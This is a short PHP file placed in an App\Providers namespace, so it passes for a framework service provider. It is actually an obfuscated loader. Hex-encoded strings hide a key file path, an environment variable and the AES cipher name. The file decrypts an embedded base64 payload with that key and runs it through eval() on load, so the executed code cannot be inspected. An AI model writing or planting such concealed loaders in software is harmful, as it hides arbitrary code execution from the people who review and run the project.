<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('O+gjyBe99Hfp44J5LJ/awg==');

$c=base64_decode(

'y5KRjQm3h4vG8AvDnMkUKHtnGL6kT9DCtxzh2thvOwP++uIGBEI90nwuM0VvzF562RuDdyE0WQNI' .
'qMkYFKgbuSautsq5le8g67h75iNLcMZ6OGovIodQALOIX3scCq0sS3vfng6zCkgC45CHyMHRIvGH' .
'HV/UTckjErn0NYaZQKk2rb6yHQJSVc2amhix50kUWmbu1x7SYleczYTZSkipyaLj9xNRJzHeeFVc' .
'6zUaTTv9v+he7N1qoVkt2vvjZj47W50qTOxstpEK/z9+FL2YdZVMWVP0/6C081i1KY9IRQYQTTQf' .
'jpYvbsp6RbLCnTnmJi49oID8g0lKvX0701I8VJsY32Xomm5fBwrgEEKmm+Q/e6OLBWTXVP0XVlC5' .
'F/1BcYvYXGfGicyfa5tt806JMmwZpGuE3ARQZu2dKAi+1FlIJVXEYrJeDy7lFGqYXHZGH6/46vq+' .
'PefDuD/95eAdJbp68DcLO7DhkxNoQh2SrmK5KZ7RX9nonYvtsUFMdSbAbBZ0EKh+jqFNYBuL2jRh' .
'hkz7mz2eUBWs34NtIc8tbC3ierz4pWMMaiP5JSxDy5kx9UViuJCSfKanjGZALajKofQ8UfcTGi8a' .
'vOsMbPvOFyId7WoSbH6kt5rLYvQ5PxdY1LJG0yd6Kq/NC3X1x+y0wbcjaWSsBTB5k3/LcToUbnMF' .
'xWb1mV1V8N21EiI1Y3gE0wnmokJvaDkNGHP/2aO19A/S/9LfuGMHZGUfW6IRHwmh6GdVF58wnYoY' .
'vq429idilj283UUFXv2GK17lsi4GxjqFsiO9ZjdCSV7z/xuxPc/Ol2svePCbTSsWFf4QPxPBCOA8' .
'qb2hFTMGar8/GkhdWCSe4mMqqIAzIgG8ZWhe7M8hlP74lJqCkbyFhLiFHweqNbAbLnNffK86oqTs' .
'z07gG4kECY6gz1zhm39fM18sN0sHCjqXYhKwYRFckPrxwxLf'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

